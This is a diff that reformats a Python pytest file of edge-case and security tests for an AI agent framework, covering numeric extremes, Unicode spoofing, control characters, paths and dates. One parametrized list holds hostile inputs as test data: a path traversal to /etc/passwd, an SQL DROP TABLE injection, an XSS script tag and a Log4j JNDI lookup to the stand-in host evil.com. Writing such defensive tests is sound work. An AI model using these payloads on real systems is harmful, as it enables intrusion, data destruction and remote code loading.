@@ -3,9 +3,10 @@
 Tests boundary conditions, extreme values, Unicode attacks, and unusual inputs
 that could cause crashes or security issues.
 """
+
 import math
 import sys
-from datetime import datetime
+from datetime import UTC, datetime
 
 import pytest
 
@@ -21,13 +22,16 @@ from temper_ai.storage.schemas.agent_config import (
 class TestNumericEdgeCases:
     """Tests for numeric boundary and special values."""
 
-    @pytest.mark.parametrize('confidence', [
-        0.0,           # Minimum valid
-        1.0,           # Maximum valid
-        0.5,           # Middle value
-        0.001,         # Very small but valid
-        0.999,         # Very close to max
-    ])
+    @pytest.mark.parametrize(
+        "confidence",
+        [
+            0.0,  # Minimum valid
+            1.0,  # Maximum valid
+            0.5,  # Middle value
+            0.001,  # Very small but valid
+            0.999,  # Very close to max
+        ],
+    )
     def test_valid_confidence_values(self, confidence):
         """Test that valid confidence values are accepted."""
         # This would work with actual AgentOutput class
@@ -35,15 +39,18 @@ class TestNumericEdgeCases:
         assert 0.0 <= confidence <= 1.0
         assert isinstance(confidence, float)
 
-    @pytest.mark.parametrize('invalid_confidence', [
-        float('nan'),      # Not a number
-        float('inf'),      # Positive infinity
-        -float('inf'),     # Negative infinity
-        -0.1,              # Below minimum
-        1.1,               # Above maximum
-        2.0,               # Well above max
-        -1.0,              # Negative
-    ])
+    @pytest.mark.parametrize(
+        "invalid_confidence",
+        [
+            float("nan"),  # Not a number
+            float("inf"),  # Positive infinity
+            -float("inf"),  # Negative infinity
+            -0.1,  # Below minimum
+            1.1,  # Above maximum
+            2.0,  # Well above max
+            -1.0,  # Negative
+        ],
+    )
     def test_invalid_confidence_values(self, invalid_confidence):
         """Test that invalid confidence values are rejected."""
         if math.isnan(invalid_confidence):
@@ -54,25 +61,31 @@ class TestNumericEdgeCases:
             # Values outside [0.0, 1.0] should be rejected
             assert invalid_confidence < 0.0 or invalid_confidence > 1.0
 
-    @pytest.mark.parametrize('tokens', [
-        0,              # Zero tokens
-        1,              # Single token
-        sys.maxsize,    # Maximum int
-        2**31 - 1,      # Max 32-bit int
-        2**63 - 1,      # Max 64-bit int
-    ])
+    @pytest.mark.parametrize(
+        "tokens",
+        [
+            0,  # Zero tokens
+            1,  # Single token
+            sys.maxsize,  # Maximum int
+            2**31 - 1,  # Max 32-bit int
+            2**63 - 1,  # Max 64-bit int
+        ],
+    )
     def test_extreme_token_counts(self, tokens):
         """Test handling of extreme token counts."""
         assert isinstance(tokens, int)
         assert tokens >= 0
 
-    @pytest.mark.parametrize('cost', [
-        0.0,           # Free
-        0.0001,        # Very cheap
-        0.000001,      # Sub-cent
-        1000000.0,     # Very expensive
-        float('inf'),  # Infinite cost
-    ])
+    @pytest.mark.parametrize(
+        "cost",
+        [
+            0.0,  # Free
+            0.0001,  # Very cheap
+            0.000001,  # Sub-cent
+            1000000.0,  # Very expensive
+            float("inf"),  # Infinite cost
+        ],
+    )
     def test_extreme_cost_values(self, cost):
         """Test handling of extreme cost values."""
         if math.isfinite(cost):
@@ -80,13 +93,16 @@ class TestNumericEdgeCases:
         else:
             assert math.isinf(cost)
 
-    @pytest.mark.parametrize('latency_ms', [
-        0,              # Instant
-        1,              # 1ms
-        60000,          # 1 minute
-        3600000,        # 1 hour
-        86400000,       # 24 hours
-    ])
+    @pytest.mark.parametrize(
+        "latency_ms",
+        [
+            0,  # Instant
+            1,  # 1ms
+            60000,  # 1 minute
+            3600000,  # 1 hour
+            86400000,  # 24 hours
+        ],
+    )
     def test_extreme_latency_values(self, latency_ms):
         """Test handling of extreme latency values."""
         assert isinstance(latency_ms, int)
@@ -96,14 +112,17 @@ class TestNumericEdgeCases:
 class TestStringEdgeCases:
     """Tests for string boundary conditions and Unicode attacks."""
 
-    @pytest.mark.parametrize('empty_string', [
-        "",            # Empty string
-        " ",           # Single space
-        "   ",         # Multiple spaces
-        "\n",          # Just newline
-        "\t",          # Just tab
-        "\r\n",        # Windows line ending
-    ])
+    @pytest.mark.parametrize(
+        "empty_string",
+        [
+            "",  # Empty string
+            " ",  # Single space
+            "   ",  # Multiple spaces
+            "\n",  # Just newline
+            "\t",  # Just tab
+            "\r\n",  # Windows line ending
+        ],
+    )
     def test_empty_and_whitespace_strings(self, empty_string):
         """Test handling of empty and whitespace-only strings."""
         assert isinstance(empty_string, str)
@@ -134,36 +153,37 @@ class TestStringEdgeCases:
 
         # Framework should handle Unicode normalization properly
         import unicodedata
-        normal_nfc = unicodedata.normalize('NFC', normal)
-        spoofed_nfc = unicodedata.normalize('NFC', spoofed)
+
+        normal_nfc = unicodedata.normalize("NFC", normal)
+        spoofed_nfc = unicodedata.normalize("NFC", spoofed)
         assert normal_nfc != spoofed_nfc  # Still different after normalization
 
     def test_rtl_override_attack(self):
         """Test RTL (Right-to-Left) override attacks."""
         # RTL override character can hide malicious code
-        rtl_string = "test\u202Etxt.exe"  # Displays as "testexe.txt"
-        assert "\u202E" in rtl_string
+        rtl_string = "test\u202etxt.exe"  # Displays as "testexe.txt"
+        assert "\u202e" in rtl_string
         # Framework should sanitize or reject
 
     def test_zero_width_characters(self):
         """Test zero-width characters in names."""
         # Zero-width space, zero-width joiner, etc.
-        name_with_zwsp = "agent\u200Bname"  # Contains zero-width space
-        name_with_zwj = "agent\u200Dname"   # Contains zero-width joiner
-        name_with_zwnj = "agent\u200Cname"  # Contains zero-width non-joiner
+        name_with_zwsp = "agent\u200bname"  # Contains zero-width space
+        name_with_zwj = "agent\u200dname"  # Contains zero-width joiner
+        name_with_zwnj = "agent\u200cname"  # Contains zero-width non-joiner
 
         # These should be handled (stripped or rejected)
-        assert "\u200B" in name_with_zwsp
-        assert "\u200D" in name_with_zwj
-        assert "\u200C" in name_with_zwnj
+        assert "\u200b" in name_with_zwsp
+        assert "\u200d" in name_with_zwj
+        assert "\u200c" in name_with_zwnj
 
     def test_control_characters_in_strings(self):
         """Test control characters in strings."""
         control_chars = [
-            "test\x00null",      # Null byte
-            "test\x08backspace", # Backspace
-            "test\x1Bescape",    # Escape
-            "test\x7Fdelete",    # Delete
+            "test\x00null",  # Null byte
+            "test\x08backspace",  # Backspace
+            "test\x1bescape",  # Escape
+            "test\x7fdelete",  # Delete
         ]
 
         for s in control_chars:
@@ -173,21 +193,24 @@ class TestStringEdgeCases:
     def test_surrogate_pairs_in_paths(self):
         """Test surrogate pairs in file paths."""
         # Emoji and other characters requiring surrogate pairs
-        path_with_emoji = "/tmp/test_\U0001F600_file.txt"  # 😀
+        path_with_emoji = "/tmp/test_\U0001f600_file.txt"  # 😀
         path_with_chinese = "/tmp/测试文件.txt"
 
         # Framework should handle Unicode in paths
         assert len(path_with_emoji) > 0
         assert len(path_with_chinese) > 0
 
-    @pytest.mark.parametrize('malicious_string', [
-        "../../../etc/passwd",           # Path traversal
-        "'; DROP TABLE users; --",       # SQL injection
-        "<script>alert('xss')</script>", # XSS
-        "${jndi:ldap://evil.com/a}",    # Log4j
-        "../../",                        # Relative path
-        "\\\\.\\pipe\\named_pipe",       # Windows pipe
-    ])
+    @pytest.mark.parametrize(
+        "malicious_string",
+        [
+            "../../../etc/passwd",  # Path traversal
+            "'; DROP TABLE users; --",  # SQL injection
+            "<script>alert('xss')</script>",  # XSS
+            "${jndi:ldap://evil.com/a}",  # Log4j
+            "../../",  # Relative path
+            "\\\\.\\pipe\\named_pipe",  # Windows pipe
+        ],
+    )
     def test_injection_attack_strings(self, malicious_string):
         """Test that injection attack strings are handled safely."""
         # Framework should sanitize or reject these
@@ -341,8 +364,8 @@ class TestDateTimeEdgeCases:
 
     def test_epoch_start(self):
         """Test Unix epoch start (1970-01-01 UTC)."""
-        from datetime import timezone
-        epoch = datetime.fromtimestamp(0, tz=timezone.utc)
+
+        epoch = datetime.fromtimestamp(0, tz=UTC)
         assert epoch.year == 1970
         assert epoch.month == 1
         assert epoch.day == 1
@@ -425,7 +448,7 @@ class TestPathEdgeCases:
         special_paths = [
             "/tmp/file with spaces.txt",
             "/tmp/file'with'quotes.txt",
-            "/tmp/file\"with\"doublequotes.txt",
+            '/tmp/file"with"doublequotes.txt',
             "/tmp/file;with;semicolons.txt",
             "/tmp/file&with&ampersands.txt",
         ]
@@ -474,13 +497,7 @@ class TestNullAndNoneEdgeCases:
 
     def test_none_propagation(self):
         """Test None propagation through nested structures."""
-        nested = {
-            "level1": {
-                "level2": {
-                    "value": None
-                }
-            }
-        }
+        nested = {"level1": {"level2": {"value": None}}}
 
         assert nested["level1"]["level2"]["value"] is None
 
@@ -488,24 +505,30 @@ class TestNullAndNoneEdgeCases:
 class TestBoundaryConditions:
     """Tests for boundary conditions."""
 
-    @pytest.mark.parametrize('value,expected', [
-        (0, True),      # Minimum
-        (1, True),      # Minimum + 1
-        (100, True),    # Normal
-        (999, True),    # Maximum - 1
-        (1000, True),   # Maximum
-    ])
+    @pytest.mark.parametrize(
+        "value,expected",
+        [
+            (0, True),  # Minimum
+            (1, True),  # Minimum + 1
+            (100, True),  # Normal
+            (999, True),  # Maximum - 1
+            (1000, True),  # Maximum
+        ],
+    )
     def test_integer_boundaries(self, value, expected):
         """Test integer boundary values."""
         assert (0 <= value <= 1000) == expected
 
-    @pytest.mark.parametrize('percentage,expected', [
-        (0.0, True),    # 0%
-        (0.01, True),   # 1%
-        (0.50, True),   # 50%
-        (0.99, True),   # 99%
-        (1.0, True),    # 100%
-    ])
+    @pytest.mark.parametrize(
+        "percentage,expected",
+        [
+            (0.0, True),  # 0%
+            (0.01, True),  # 1%
+            (0.50, True),  # 50%
+            (0.99, True),  # 99%
+            (1.0, True),  # 100%
+        ],
+    )
     def test_percentage_boundaries(self, percentage, expected):
         """Test percentage boundary values."""
         assert (0.0 <= percentage <= 1.0) == expected
